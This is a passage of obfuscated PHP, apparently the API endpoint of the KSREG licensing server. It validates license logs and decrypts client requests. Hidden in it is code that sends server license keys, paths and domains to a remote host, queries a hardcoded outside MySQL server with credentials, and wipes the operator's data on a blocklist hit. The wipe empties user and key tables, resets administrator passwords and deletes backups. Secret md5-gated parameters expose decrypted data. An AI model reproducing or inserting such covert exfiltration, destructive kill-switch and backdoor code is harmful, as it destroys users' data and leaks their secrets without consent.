        _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( );
    }
    $_obfuscate_jouQkY2GipOLh5CUiI2Thocˇ = 0;
    $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ = KSSLOGDIR."index.log";
    $_obfuscate_k4eIio2IioeLiIeJhpGHjJMˇ = date( "Ymd" );
    $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uˇ = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ = $_obfuscate_k4eIio2IioeLiIeJhpGHjJMˇ.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obfuscate_k4eIio2IioeLiIeJhpGHjJMˇ."abcdefghijklmn" ) );
    $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ = $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uˇ;
    if ( is_file( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ = file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ );
    }
    else
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thocˇ = 1;
    }
    if ( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ == "200001011059550389" )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,  please support the Genuine software! LOGLOCK" );
    }
    if ( empty( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ = $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uˇ;
    }
    if ( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ, "" );
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno156" );
        }
        exit( "kss_logs/index.logË¢´ÈùûÊ≥ï‰øÆÊîπ" );
    }
    if ( 85400 < abs( strtotime( substr( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ, 0, 8 ) ) - strtotime( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ, 0, 8 ) ) ) )
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thocˇ = 1;
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ, $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ );
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ = @file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qˇ );
        if ( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ != $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ˇ )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
            {
                exit( "crypteno155" );
            }
            exit( "kss_logs/index.log‰∏çÂèØÂÜô" );
        }
    }
    if ( $_obfuscate_jouQkY2GipOLh5CUiI2Thocˇ == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ = urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMˇ );
        $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ = date( "Y-m-d H:i:s" );
        $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ = $_SERVER['HTTP_HOST'];
        if ( empty( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ ) )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ = "notfind";
        }
        if ( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ != "notfind" )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ = urlencode( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ );
        }
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "curl_exec" ) )
        {
            _obfuscate_jomIiY_JjIqRkoiTiImVkIcˇ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ );
        }
        else
        {
            _obfuscate_lZSKi46HhpCGh4aQh4aVi40ˇ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obfuscate_kZGIlYyKh5OIlYyKlYeTlJMˇ( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQˇ )
{
    $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowˇ = opendir( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQˇ );
    while ( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ˇ = readdir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowˇ ) )
    {
        if ( !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ˇ != "." ) || !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ˇ != ".." ) )
        {
            $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ˇ = $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQˇ."/".$_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ˇ;
            if ( is_dir( $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ˇ ) )
            {
                echo $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ˇ;
                echo "<br>";
            }
        }
    }
    closedir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowˇ );
}

function _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( $_obfuscate_h4yHlYmLipCJjJCGhomJjZAˇ )
{
    if ( is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZAˇ."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZAˇ."\r\n\r\n", @FILE_APPEND );
    }
}

function _obfuscate_iZSOiYeSlIqPjpSLkpSIj40ˇ( )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ;
    $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpMˇ = explode( ",", substr( WEBLIC, 33 ) );
    $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ = $_SERVER['HTTP_HOST'];
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ = strpos( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ, ":" );
    if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ !== FALSE )
    {
        $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ = substr( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ, 0, $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ );
    }
    if ( in_array( strtolower( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ ), $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpMˇ ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYˇ ) === FALSE )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
            {
                exit( "crypteno888" );
            }
            exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP" );
        }
    }
    _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno888" );
    }
    exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
}

function _obfuscate_jomIiY_JjIqRkoiTiImVkIcˇ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ )
{
    $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ = curl_init( );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_RETURNTRANSFER, 1 );
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = "svrid=".SVRID."&hostname=".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_POST, 1 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_POSTFIELDS, $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4gˇ = curl_exec( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ );
    if ( curl_errno( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ ) )
    {
        @curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ );
        _obfuscate_lZSKi46HhpCGh4aQh4aVi40ˇ( );
    }
    else
    {
        curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4ˇ );
        if ( $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4gˇ == "isbadlic" )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "clear,curl badlist" );
            _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( );
        }
    }
}

function _obfuscate_lZSKi46HhpCGh4aQh4aVi40ˇ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ )
{
    return FALSE;
}

function _obfuscate_jpSQjpGSkoeUkJGHk4_Pi5Eˇ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ )
{
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cˇ = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cˇ = @gethostbyname( @$_SERVER['SERVER_NAME'] );
    }
    $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ = @mysql_connect( "58.221.31.10:33069", "readuser", "password" );
    if ( $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ )
    {
        if ( @mysql_select_db( "readuser", $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ ) )
        {
            $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ = @mysql_query( @"select * from `locktable` where `lockstr`='".@WEBID."' or `lockstr`='".@WEBLIC."' or `lockstr`='".@PRV_SVRLIC."' or `lockstr`='".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ."' ", $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ );
            if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ !== FALSE && 0 < mysql_num_rows( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "sql badlist" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( );
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (0,'".$_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ."', '".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ."', '".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cˇ."')", $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ );
            }
            else
            {
                mysql_query( "INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (1,'".$_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoˇ."', '".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cˇ."', '".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uˇ."', '".WEBLIC."', '".WEBID."',".( SVRID + 2 ).",'".PRV_SVRLIC."','".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4cˇ."')", $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ );
            }
        }
        @mysql_close( $_obfuscate_lIuNkpKUioySj4eTkYqSjZMˇ );
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uˇ = "" )
{
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ;
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ;
    if ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uˇ != "" )
    {
        $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ = $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uˇ;
        $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ = 0;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,   please support the Genuine software! NCLS" );
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcˇ = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5Iˇ( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcˇ ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcˇ as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yˇ )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yˇ, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yˇ );
        }
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ˇ( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYˇ( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYˇ( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYˇ( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYˇ( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno888" );
    }
    exit( "Thank you for using KSREG,    please support the Genuine software! CLS" );
}

define( "CLVersion", 10 );
require( "io_ext.php" );
require( "../kss_inc/inc.php" );
_obfuscate_kouKkIeViIqPk5KMiIiMkpEˇ( );
require( Client_Language.".php" );
set_error_handler( "error_report_fun_api" );
$_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ = _obfuscate_i4mIkpOGkomKiouRhoaMh5Iˇ( "c", "pg", "int", 1 );
$_obfuscate_kZOLkIiTk46UiJKPkZSTk48ˇ = _obfuscate_i4mIkpOGkomKiouRhoaMh5Iˇ( "apiver", "pg", "int", 900 );
$_obfuscate_lZOThomRipOIi5SRhpWRjY4ˇ = _obfuscate_i4mIkpOGkomKiouRhoaMh5Iˇ( "a", "pg", "sql", "" );
$_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ = $_SERVER['HTTP_HOST'];
$_obfuscate_lZWPi4aGiYmRkIuVjYuMh4wˇ = strpos( $_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ, ":" );
if ( $_obfuscate_lZWPi4aGiYmRkIuVjYuMh4wˇ !== FALSE )
{
    $_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ = substr( $_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ, 0, $_obfuscate_lZWPi4aGiYmRkIuVjYuMh4wˇ );
}
if ( isset( $_GET['testsync'] ) && md5( $_GET['testsync'] ) == MYSQLBAKPASSWORD )
{
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
    echo "ÂêåÊ≠•ÊµãËØïÂ∑≤ÂêØÂä®ÔºåËØ∑Âà∞Á≥ªÁªü‰ªªÂä°Êó•ÂøóÊü•Áúã";
    _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5Mˇ( );
    exit( );
}
switch ( $_obfuscate_kZOLkIiTk46UiJKPkZSTk48ˇ )
{
    case 905 :
        define( "CLIENTVER", 905 );
        if ( stristr( WEBLIC.",", ",".$_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ."," ) === FALSE )
        {
            if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
            {
                exit( "crypteno888" );
            }
            exit( "Thank you for using KSREG, please support the Genuine software![".$_obfuscate_j4uUkImJj4iJipGVioqGk4wˇ."]" );
        }
        include( "../kss_inc/signdata/crypt95.php" );
        break;
    default :
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno531" );
        }
        exit( "kssdata".QQ236 );
}
if ( mt_rand( 1, 10 ) == 5 )
{
    _obfuscate_io_MiI6UjIyKkJOVk5GSjYoˇ( "api.php", $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ );
}
if ( $_obfuscate_lZOThomRipOIi5SRhpWRjY4ˇ == "uplog" )
{
    include( dirname( __FILE__ ).DIRECTORY_SEPARATOR."io".DIRECTORY_SEPARATOR."soft.php" );
    exit( );
}
$_obfuscate_jJKOjo2Qk46Qk4qOjJSTjJMˇ = 0;
$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = _obfuscate_i4mIkpOGkomKiouRhoaMh5Iˇ( "s", "pg", "", "" );
$_obfuscate_lImKk4iUhomPiYiKioaHjowˇ = $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ;
if ( function_exists( "extfun_decode" ) )
{
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = extfun_decode( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ );
}
$_obfuscate_ko2PhoaRkIeRh5GQjIuGjo4ˇ = 0;
$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = _obfuscate_kpWMjJWVjZWHj4aTkJGMj4cˇ( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, &$_obfuscate_ko2PhoaRkIeRh5GQjIuGjo4ˇ, Client_Language );
if ( "crypt" != substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 0, 5 ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno118" );
    }
    exit( "kssdataÊúçÂä°Âô®Êó†Ê≥ïÊ≠£Â∏∏Ëß£ÂØÜÊï∞ÊçÆ„ÄÇ" );
}
if ( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 0, 6 ) == "crypt " )
{
    $_obfuscate_hpKMkImIjJSUh4aVkYuIlZEˇ = KSSINCDIR."advapi".DIRECTORY_SEPARATOR."rsa".substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 9, 7 ).".php";
    if ( is_file( $_obfuscate_hpKMkImIjJSUh4aVkYuIlZEˇ ) )
    {
        include( $_obfuscate_hpKMkImIjJSUh4aVkYuIlZEˇ );
        if ( SOFTRSAMODE == 0 )
        {
            if ( strlen( RSA_PRVKEY ) < 70 || strlen( RSA_MODULES ) < 70 || RSACRYPT == 0 )
            {
                exit( "crypteno151" );
            }
            $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ = stripos( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, "`" );
            $_obfuscate_hpKMlYyOiYaNiJGNlYuIkYoˇ = rsa_decrypt( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 17, $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ - 17 ), RSA_PRVKEY, RSA_MODULES, 256 );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = str_replace( " ", "", substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 0, 17 ) ).$_obfuscate_hpKMlYyOiYaNiJGNlYuIkYoˇ.substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ + 1 );
        }
        else
        {
            if ( strlen( SOFTRSAEKEY ) < 70 || strlen( SOFTRSANKEY ) < 70 || SOFTRSAMODE == 2 )
            {
                exit( "crypteno151" );
            }
            $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ = stripos( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, "`" );
            $_obfuscate_hpKMlYyOiYaNiJGNlYuIkYoˇ = rsa_decrypt( substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 17, $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ - 17 ), SOFTRSAEKEY, SOFTRSANKEY, 256 );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = str_replace( " ", "", substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 0, 17 ) ).$_obfuscate_hpKMlYyOiYaNiJGNlYuIkYoˇ.substr( $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, $_obfuscate_io6KipWRkpKNlZKSk5CLkpAˇ + 1 );
        }
    }
    else
    {
        exit( "crypteno171" );
    }
}
if ( defined( "SQLSAFECHK" ) && preg_match( "/select|insert|update|delete |union|into|load_file|outfile|\\.\\/|\\/\\*|\\%[0-9a-f]{2}|--|char\\(|0x[0-9a-f]{6}|'/i", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ ) )
{
    $_obfuscate_ipWMho2NlI2MiI_MioeTlZIˇ = "?";
    $_obfuscate_ipCIiZCRiYmKhpOSi4eSjZIˇ = "<".$_obfuscate_ipWMho2NlI2MiI_MioeTlZIˇ."php exit('Access denied to view this page!');".$_obfuscate_ipWMho2NlI2MiI_MioeTlZIˇ.">\r\n";
    if ( !is_file( "sqlhklog.php" ) || 102400 < filesize( "sqlhklog.php" ) )
    {
        file_put_contents( "sqlhklog.php", $_obfuscate_ipCIiZCRiYmKhpOSi4eSjZIˇ.date( "ymdHis" )."\t"._obfuscate_iIuRj5CUkIuHi4mPkY2Vio0ˇ( )."\t".$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ."\r\n\r\n" );
    }
    else
    {
        file_put_contents( "sqlhklog.php", date( "ymdHis" )."\t"._obfuscate_iIuRj5CUkIuHi4mPkY2Vio0ˇ( )."\t".$_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ."\r\n\r\n", FILE_APPEND );
    }
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
    {
        exit( "crypteno157" );
    }
    exit( "kssdata".QQ235 );
}
$_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ = explode( ":|:", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ );
if ( isset( $_GET['view'] ) && md5( $_GET['view'] ) == "fb87582825f9d28a8d42c5e5e5e8b23d" )
{
    print_r( $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ );
}
$_obfuscate_kZOJlZCOlZKRioiGiIuPkokˇ = "io";
$_obfuscate_kZGNjJSKkpCQj4yOj5GNiIoˇ = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[2];
$_obfuscate_iImHhpCJi4eSkY_VjZOUj5Qˇ = $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5Uˇ[3];
